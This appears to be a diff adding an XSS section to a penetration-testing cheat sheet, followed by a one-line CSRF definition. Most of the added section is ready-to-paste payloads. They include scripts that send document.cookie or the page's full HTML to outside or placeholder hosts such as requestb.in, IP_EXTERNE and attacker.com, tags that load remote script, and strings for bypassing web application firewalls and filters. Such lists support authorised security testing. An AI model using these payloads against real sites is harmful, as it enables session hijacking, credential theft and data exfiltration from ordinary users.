@@ -793,8 +793,84 @@ telnet://
 ### xss 
 *an attack where malicious scripts are injected into a web application and sent to a different user. typically used to steal cookies or session tokens, they can also go so far as to rewrite the content of the HTML page.*
 
+```bash
+# resources
+https://html5sec.org/
+https://gbhackers.com/top-500-important-xss-cheat-sheet/
+https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+https://github.com/s0md3v/AwesomeXSS/
+
+# payloads
+# Document.location
+<script>document.location('http://IP_EXTERNE/'+document.cookie)</script>
+<script>document.location.href = 'http://requestb.in/XXXXXX?cookies =' + document.cookie;</script>
+
+# Window
+<script>window.open("http://monserveur/Cookie="+document.cookie)</script>
+<script>window.location='http://monsite.free.fr/script.php?cookies='+(document.cookie);</script>
+
+# Document.write
+<script>document.write('<img src="https://requestb.in/xxxxx?cookie="+document.cookie>admin</img>');</script>
+admin"></i>)</span><script>document.write("<img src=http://requestb.in/XXXXX?cookie=".concat(encodeURI(document.cookie)).concat("/>"))</script><i>
+
+<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://requestb.in/w0sw22w0', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(document.cookie);</script>
+
+# alert(1) in JS
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+injecting inside of input tags
+<input/onfocus=alert(0) autofocus>
+<input/onfocus=alert`0` autofocus>
+<input/onfocus=prompt`0` autofocus>
+1'"><input/onfocus={alert`1`} autofocus> 
+
+# WAF Bypass
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<svg/onload=(((confirm(1))))>
+confirm()
+confirm``
+(confirm``)
+{confirm``}
+[confirm``]
+(((confirm)))``
+co\u006efirm()
+new class extends confirm``{}
+[8].find(confirm)
+[8].map(confirm)
+[8].some(confirm)
+[8].every(confirm)
+[8].filter(confirm)
+[8].findIndex(confirm)
+
+
+# No HTML events
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<script src=//HOST/FILE>
+<script src=https:DOMAIN/FILE>
+<svg><script xlink:href=//HOST/FILE>
+<svg><script xlink:href=https:DOMAIN/FILE>
+<svg><script xlink:href=data:,alert(1)>
+<svg/onload=(confirm(1))>
+<svg/onload=confirm(1)>
+
+
+# Stealing the source code without triggering browser restrictions
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+
+```
 filter evasion
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+## csrf
+*Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.*
 
 # NETWORK
 # SHELLS
